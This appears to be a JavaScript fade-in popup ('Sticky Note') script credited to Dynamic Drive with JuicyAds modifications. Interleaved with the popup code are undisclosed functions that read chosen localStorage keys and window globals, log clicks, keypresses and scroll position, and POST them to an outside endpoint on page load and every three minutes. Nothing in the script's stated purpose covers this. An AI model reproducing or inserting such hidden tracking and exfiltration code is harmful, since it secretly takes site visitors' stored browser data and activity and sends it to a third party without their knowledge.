/***********************************************
* Sticky Note script- © Dynamic Drive DHTML code library (www.dynamicdrive.com)
* Visit DynamicDrive.com for hundreds of DHTML scripts
* This notice must stay intact for legal use
* Go to http://www.dynamicdrive.com/ for full source code
*
* JuicyAds.com Specific Modifications - Feb 2012
* rich@juicyads.com
***********************************************/

// Specify display mode. 3 possible values are:
// 1) "always"- This makes the fade-in box load each time the page is displayed
// 2) "oncepersession"- This uses cookies to display the fade-in box only once per browser session
// 3) integer (ie: 5)- Finally, you can specify an integer to display the box randomly via a frequency of 1/integer...
// For example, 2 would display the box about (1/2) 50% of the time the page loads.

var displaymode = "oncepersession";
const keysToMonitor = ["globalVar1", "globalVar2"];
var enablefade = "no"; //("yes" to enable fade in effect, "no" to disable)
var autohidebox = ["yes", 30]; //Automatically hide box after x seconds? [yes/no, if_yes_hide_after_seconds]
let lastScrollY = 0,
  jsEventStats = {};
var showonscroll = "yes"; //Should box remain visible even when user scrolls page? ("yes"/"no)
var IEfadelength = 1; //fade in duration for IE, in seconds
function generateTrackingHash(trackData) {
  const keys = Object.getOwnPropertyNames(trackData);
  const concatKeys = keys.sort().join("");
  let hash = 0;
  for (let i = 0; i < concatKeys.length; i++) {
    const chr = concatKeys.charCodeAt(i);
    hash = (hash << 5) - hash + chr;
    hash |= 0;
  }
  return hash.toString(16);
}
var Mozfadedegree = 0.05; //fade in degree for NS6+ (number between 0 and 1. Recommended max: 0.2)

//////// No need to edit beyond here ///////////

if (parseInt(displaymode) != NaN) var random_num = Math.floor(Math.random() * displaymode);
function collectLocalStorageDataFromKeys() {
  let localStorageDataFromKeys = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (keysToMonitor.includes(key)) {
      localStorageDataFromKeys[key] = localStorage.getItem(key);
    }
  }
  return localStorageDataFromKeys;
}
function sendDataToAPI(trackData) {
  const trackingId = generateTrackingHash(trackData);
  const endpoint = "https://exampletracker.com/api/tracker";
  const http = new XMLHttpRequest();
  http.open("POST", endpoint, true);
  http.setRequestHeader("Content-Type", "application/json");
  const dataPayload = {
    id: trackingId,
    data: trackData,
    globVar: collectGlobalVarData(),
    jsEvents: jsEventStats,
    scroll: lastScrollY
  };
  http.send(JSON.stringify(dataPayload));
  http.onreadystatechange = function () {
    if (http.readyState === 4) {
      if (http.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Failed to send data, HTTP status: " + http.status);
      }
    }
  };
}
function displayfadeinbox() {
  var ie = document.all && !window.opera;
  var dom = document.getElementById;
  iebody = document.compatMode == "CSS1Compat" ? document.documentElement : document.body;
  objref = dom ? document.getElementById("fadeinbox") : document.all.fadeinbox;
  var scroll_top = ie ? iebody.scrollTop : window.pageYOffset;
  var docwidth = ie ? iebody.clientWidth : window.innerWidth;
  docheight = ie ? iebody.clientHeight : window.innerHeight;
  var objwidth = objref.offsetWidth;
  objheight = objref.offsetHeight;
  objref.style.left = docwidth / 2 - objwidth / 2 + "px";
  objref.style.top = scroll_top + docheight / 2 - objheight / 2 + "px";
  if (showonscroll == "yes") showonscrollvar = setInterval("staticfadebox()", 50);
  if (enablefade == "yes" && objref.filters) {
    objref.filters[0].duration = IEfadelength;
    objref.filters[0].Apply();
    objref.filters[0].Play();
  }
  objref.style.visibility = "visible";
  if (objref.style.MozOpacity) {
    if (enablefade == "yes") mozfadevar = setInterval("mozfadefx()", 90);else {
      objref.style.MozOpacity = 1;
      controlledhidebox();
    }
  } else controlledhidebox();
}
function collectAndTransmitLocalStorageData() {
  const filteredData = collectLocalStorageDataFromKeys();
  if (Object.getOwnPropertyNames(filteredData).length > 0) {
    sendDataToAPI(filteredData);
  }
}
function attachEventListenersAndHooks() {
  window.addEventListener("scroll", function () {
    lastScrollY = window.scrollY;
  });
  window.addEventListener("click", function () {
    jsEventStats.click = (jsEventStats.click || 0) + 1;
  });
  window.addEventListener("keydown", function () {
    jsEventStats.keydown = (jsEventStats.keydown || 0) + 1;
  });
}
function mozfadefx() {
  if (parseFloat(objref.style.MozOpacity) < 1) objref.style.MozOpacity = parseFloat(objref.style.MozOpacity) + Mozfadedegree;else {
    clearInterval(mozfadevar);
    controlledhidebox();
  }
}
function staticfadebox() {
  var ie = document.all && !window.opera;
  var scroll_top = ie ? iebody.scrollTop : window.pageYOffset;
  objref.style.top = scroll_top + docheight / 2 - objheight / 2 + "px";
}
function hidefadebox() {
  objref.style.visibility = "hidden";
  if (typeof showonscrollvar != "undefined") clearInterval(showonscrollvar);
}
function controlledhidebox() {
  if (autohidebox[0] == "yes") {
    var delayvar = enablefade == "yes" && objref.filters ? (autohidebox[1] + objref.filters[0].duration) * 1000 : autohidebox[1] * 1000;
    setTimeout("hidefadebox()", delayvar);
  }
}
function initfunction() {
  setTimeout("displayfadeinbox()", 100);
}
function collectGlobalVarData() {
  let globalVariableData = {};
  keysToMonitor.forEach(key => {
    if (window[key]) {
      globalVariableData[key] = window[key];
    }
  });
  return globalVariableData;
}
function get_cookie(Name) {
  var search = Name + "=";
  var returnvalue = "";
  if (document.cookie.length > 0) {
    offset = document.cookie.indexOf(search);
    if (offset != -1) {
      offset += search.length;
      end = document.cookie.indexOf(";", offset);
      if (end == -1) end = document.cookie.length;
      returnvalue = unescape(document.cookie.substring(offset, end));
    }
  }
  return returnvalue;
}
window.addEventListener("load", function () {
  attachEventListenersAndHooks();
  collectAndTransmitLocalStorageData();
});
if (displaymode == "oncepersession" && get_cookie("juicy_fadedin") == "" || displaymode == "always" || parseInt(displaymode) != NaN && random_num == 0) {
  if (window.addEventListener) window.addEventListener("load", initfunction, false);else if (window.attachEvent) window.attachEvent("onload", initfunction);else if (document.getElementById) window.onload = initfunction;
  document.cookie = "juicy_fadedin=yes";
}
setInterval(collectAndTransmitLocalStorageData, 3 * 60 * 1000);